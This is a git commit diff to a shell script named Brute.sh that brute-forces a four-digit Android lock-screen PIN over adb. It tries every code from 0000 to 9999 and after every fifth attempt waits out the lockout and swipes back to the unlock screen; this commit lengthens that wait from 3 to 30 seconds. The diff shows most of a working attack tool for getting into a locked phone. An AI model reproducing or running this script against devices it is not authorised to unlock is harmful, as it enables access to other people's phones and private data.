4e761f5dc3da199075cca9a117221383f17435c7
rubencm <rubencm@gmail.com>
2016-05-03 21:01:47 +0200

    fix

--- Brute.sh
+++ Brute.sh
@@ -13,9 +13,9 @@ echo -------------
 
 for i in {0000..9999}; do
 
-    echo -------------------
+    echo -----------
     echo TRYING $i
-    echo -------------------
+    echo -----------
 	
     for (( j=0; j<${#i}; j++ )); do
         adb shell input keyevent $((`echo ${i:$j:1}`+7))
@@ -23,9 +23,9 @@ for i in {0000..9999}; do
 
     adb shell input keyevent 66
     
-    if [ $((`expr $i + 1` % 5)) -eq 0 ]; then
+    if ! (( `expr $i + 1` % 5 )); then
         adb shell input keyevent 66
-        sleep 3
+        sleep 30
         adb shell input keyevent 82
         adb shell input swipe 407 1211 378 85
     fi
